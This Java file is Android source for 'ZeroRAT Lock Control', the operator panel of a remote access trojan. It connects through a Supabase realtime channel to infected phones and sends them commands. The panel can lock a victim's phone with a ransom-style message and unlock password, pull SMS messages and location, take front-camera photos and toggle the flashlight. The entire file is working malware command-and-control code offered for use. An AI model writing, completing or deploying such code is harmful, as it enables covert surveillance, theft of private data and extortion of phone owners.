package com.zero.operator;
import android.app.Activity; import android.content.Context; import android.graphics.Bitmap; import android.graphics.BitmapFactory; import android.os.Bundle; import android.util.Base64; import android.view.Gravity; import android.view.ViewGroup; import android.widget.*; import org.json.JSONObject; import java.util.UUID;
public class OperatorActivity extends Activity {
    private static final String ROOM = "rat-room-v9";
    private SupabaseRealtime rt; private TextView log; private ImageView imgView;
    private EditText etMsg, etPass;
    protected void onCreate(Bundle b){
        super.onCreate(b);
        LinearLayout root = new LinearLayout(this); root.setOrientation(LinearLayout.VERTICAL); root.setPadding(16,16,16,16);
        TextView title = new TextView(this); title.setText("ZeroRAT Lock Control"); title.setTextSize(20); title.setGravity(Gravity.CENTER); root.addView(title);
        
        etMsg = new EditText(this); etMsg.setHint("Pesan Kunci (Cth: HP Disita)"); root.addView(etMsg);
        etPass = new EditText(this); etPass.setHint("Password Unlock (Cth: 123)"); root.addView(etPass);

        GridLayout grid = new GridLayout(this); grid.setColumnCount(2);
        addBtn(grid, "Kunci HP", "lock");
        addBtn(grid, "Buka Kunci", "unlock");
        addBtn(grid, "Info HP", "info");
        addBtn(grid, "SMS", "sms");
        addBtn(grid, "Lokasi", "location");
        addBtn(grid, "Foto Depan", "cam_front");
        addBtn(grid, "Senter ON", "flash_on");
        addBtn(grid, "Senter OFF", "flash_off");
        root.addView(grid);

        ScrollView scroll = new ScrollView(this); log = new TextView(this); log.setTextSize(10); log.setText("Menghubungkan...\n"); scroll.addView(log);
        root.addView(scroll, new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));
        setContentView(root);
        
        rt = new SupabaseRealtime(ROOM, "operator", p -> runOnUiThread(() -> {
            String type = p.optString("type");
            if(type.equals("text")) log.append("\n[+] " + p.optString("data"));
            else log.append("\n["+type+"]\n"+p.toString()+"\n");
        }));
        log.append("Terhubung.\n");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (rt != null) rt.close();
    }

    private void addBtn(GridLayout grid, String text, String cmd) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setOnClickListener(v -> kirim(cmd));
        grid.addView(btn, new GridLayout.LayoutParams(GridLayout.spec(GridLayout.UNDEFINED, 1f), GridLayout.spec(GridLayout.UNDEFINED, 1f)));
    }

    private void kirim(String cmdStr) {
        try {
            JSONObject c = new JSONObject();
            c.put("cmd", cmdStr);
            c.put("id", UUID.randomUUID().toString());
            if(cmdStr.equals("lock")) {
                c.put("msg", etMsg.getText().toString());
                c.put("pass", etPass.getText().toString());
            }
            rt.send("cmd", c);
            log.append("\n>> "+cmdStr);
        } catch(Exception e){}
    }
}